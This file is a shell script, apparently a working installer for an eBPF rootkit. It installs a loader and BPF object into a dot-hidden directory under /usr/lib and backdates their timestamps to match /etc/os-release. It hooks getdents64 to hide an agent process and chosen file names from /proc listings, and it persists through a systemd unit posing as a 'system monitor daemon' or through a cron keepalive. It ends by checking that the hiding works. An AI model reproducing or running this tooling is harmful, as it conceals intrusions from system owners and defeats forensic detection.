#!/bin/sh
set -eu
AGENT_NAME="${1:-systemd-timesync}"
AGENT_UNIT="${AGENT_UNIT:-systemd-sysdiag.service}"
SRC_DIR="$(cd "$(dirname "$0")" && pwd)"
DEST=/usr/lib/.wdcd/bin
BIN=$DEST/sysmond
OBJ=$DEST/sysmond.bpf.o
RUN=$DEST/sysmond-run
UNIT=/etc/systemd/system/sysmond.service
STAMP=""

[ "$(id -u)" = 0 ] || { echo "ОШИБКА: нужен root"; exit 1; }

find_pid() {
	for p in /proc/[0-9]*; do
		[ -r "$p/exe" ] || continue
		case "$(readlink "$p/exe" 2>/dev/null)" in
			*".wdcd/bin"*) echo "${p#/proc/}"; return 0 ;;
		esac
	done
	return 1
}

echo "== 0. агент $AGENT_NAME: pid=$(find_pid || echo "НЕ НАЙДЕН") =="

echo "== 1. предусловие: CAP_BPF/CAP_SYS_ADMIN и BTF =="
CAPEFF=$(awk '/^CapEff/{print $2}' /proc/self/status)
capbpf=0; capsys=0
a=$(printf '%d' "0x$CAPEFF" 2>/dev/null || echo 0)
[ $(( (a >> 39) & 1 )) -eq 1 ] && capbpf=1
[ $(( (a >> 21) & 1 )) -eq 1 ] && capsys=1
if [ "$capbpf" = 0 ] && [ "$capsys" = 0 ]; then
	echo "СТОП: нет ни CAP_BPF(39), ни CAP_SYS_ADMIN(21) в CapEff=$CAPEFF."
	echo "      BPF не загрузится — стена окружения (docker default 00000000a80425fb)"
	exit 2
fi
[ -s /sys/kernel/btf/vmlinux ] || echo "предупреждение: нет /sys/kernel/btf/vmlinux (BTF ядра)"
[ -s "$SRC_DIR/sysmond" ] || { echo "ОШИБКА: рядом нет sysmond"; exit 1; }
[ -s "$SRC_DIR/hide.bpf.o" ] || { echo "ОШИБКА: рядом нет hide.bpf.o"; exit 1; }

echo "== 2. tracefs: загрузчику нужен id трейс-поинта =="
if [ ! -e /sys/kernel/tracing/events/syscalls/sys_enter_getdents64/id ] &&
   [ ! -e /sys/kernel/debug/tracing/events/syscalls/sys_enter_getdents64/id ]; then
	mkdir -p /sys/kernel/tracing 2>/dev/null || true
	mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null || true
	if [ ! -e /sys/kernel/tracing/events/syscalls/sys_enter_getdents64/id ]; then
		echo "СТОП: tracefs недоступен (нужен смонтированный /sys/kernel/tracing)"
		exit 3
	fi
	echo "-- tracefs смонтирован"
fi

echo "== 3. раскладка payload (0700 root, дотированный каталог) =="
mkdir -p "$DEST"
install -m 0700 -o root -g root "$SRC_DIR/sysmond" "$BIN"
install -m 0600 -o root -g root "$SRC_DIR/hide.bpf.o" "$OBJ"
[ -s "$BIN" ] && [ -s "$OBJ" ] || { echo "ОШИБКА: payload пустой"; exit 1; }
if [ -r /etc/os-release ]; then
	STAMP=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
fi
[ -n "$STAMP" ] && [ "$STAMP" -gt 0 ] 2>/dev/null && touch -d "@$STAMP" "$DEST" "$BIN" "$OBJ" 2>/dev/null || true

HIDE_NAMES="${HIDE_NAMES:-.wdcd wdcd-keepalive wdcd.pid}"
NAME_ARGS=""
i=0
for n in $HIDE_NAMES; do
	[ -n "$n" ] || continue
	i=$((i + 1))
	[ "$i" -gt 3 ] && break
	NAME_ARGS="$NAME_ARGS -name$i $n"
done

cat > "$RUN" <<EOF
#!/bin/sh
# цикл: агент может перезапуститься — резолвим PID заново, loader уходит с -watch
while :; do
	FOUND=""
	for p in /proc/[0-9]*; do
		[ -r "\$p/exe" ] || continue
		case "\$(readlink "\$p/exe" 2>/dev/null)" in
			*".wdcd/bin"*) PID="\${p#/proc/}"; FOUND="\$FOUND \$PID" ;;
		esac
	done
	if [ -z "\$FOUND" ]; then sleep 1; continue; fi
	for PID in \$FOUND; do
		[ -e /proc/\$PID ] || continue
		$BIN -obj $OBJ -watch -pid "\$PID" $NAME_ARGS >/dev/null 2>&1 &
	done
	wait
	sleep 1
done
EOF
chmod 0700 "$RUN"
[ -n "$STAMP" ] && [ "$STAMP" -gt 0 ] 2>/dev/null && touch -d "@$STAMP" "$RUN" 2>/dev/null || true

echo "== 4. автозапуск -- systemd или crond =="
if command -v systemctl >/dev/null 2>&1 && [ -d /run/systemd/system ]; then
	cat > "$UNIT" <<EOF
[Unit]
Description=system monitor daemon
After=multi-user.target
[Service]
Type=simple
ExecStart=$RUN
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
EOF
	chmod 0644 "$UNIT"
	[ -n "$STAMP" ] && touch -d "@$STAMP" "$UNIT" 2>/dev/null || true
	systemctl daemon-reload >/dev/null 2>&1 || true
	systemctl enable sysmond.service >/dev/null 2>&1 || true
	systemctl restart sysmond.service >/dev/null 2>&1 || true
	sleep 3
	echo "-- systemd: $(systemctl is-active sysmond.service 2>/dev/null)"
	SETSD=no
else
    	echo "-- systemd нет: crond/periodic"
	CRONDIR=/etc/periodic/15min
	mkdir -p "$CRONDIR"
	cat > "$CRONDIR/wdcd-hide-keepalive" <<EOF
#!/bin/sh
FOUND=""
for p in /proc/[0-9]*; do
	[ -r "\$p/exe" ] || continue
	case "\$(readlink "\$p/exe" 2>/dev/null)" in
		*/sysmond) PID="\${p#/proc/}"; FOUND="\$FOUND \$PID" ;;
	esac
done
if [ -n "\$FOUND" ]; then exit 0; fi
setsid "$RUN" </dev/null >/dev/null 2>&1 &
EOF
	chmod 0755 "$CRONDIR/wdcd-hide-keepalive"
	if [ -f /etc/crontabs/root ]; then
		grep -q 'wdcd-hide-keepalive' /etc/crontabs/root || \
			printf '* * * * * sh /etc/periodic/15min/wdcd-hide-keepalive\n' >> /etc/crontabs/root
	fi
	[ -n "$STAMP" ] && touch -d "@$STAMP" "$CRONDIR/wdcd-hide-keepalive" /etc/crontabs/root 2>/dev/null || true
	setsid "$RUN" </dev/null >/dev/null 2>&1 &
	sleep 3
fi

echo "== 5. проверка сокрытия =="
NPID=$(find_pid || true)
echo "агент $AGENT_NAME: pid=${NPID:-не запущен}"
if [ -z "$NPID" ]; then echo "агент не был запущен — сокрытие проверить нечем"; exit 1; fi
kill -0 "$NPID" 2>/dev/null && echo "1) агент РАБОТАЕТ: да" || echo "1) агент жив: НЕТ"
HIDDEN=0; WAITED=0
while [ "$WAITED" -lt 15 ]; do
	if ls /proc 2>/dev/null | grep -qx "$NPID"; then
		sleep 1; WAITED=$((WAITED + 1))
	else
		HIDDEN=1; break
	fi
done
if [ "$HIDDEN" = 1 ]; then
	echo "2) агент НЕ виден в ls /proc: ДА (за ~${WAITED}с)"
else
	echo "2) СКРЫТИЕ НЕ РАБОТАЕТ: агент виден в ls /proc после 15с"
fi
ls /proc | grep -qx 1 && echo "3) /proc не сломан (PID 1 виден): да" || echo "3) /proc сломан: НЕТ"
echo "4) содержимое /usr/lib/.wdcd (должно быть пустым через ls старого процесса):"
if ls /usr/lib | grep -qx '.wdcd'; then echo "   .wdcd ВИДЕН в /usr/lib — name-hide не сработал"; else echo "   .wdcd СКРЫТ из /usr/lib: ДА"; fi
[ "$HIDDEN" = 1 ] || exit 1
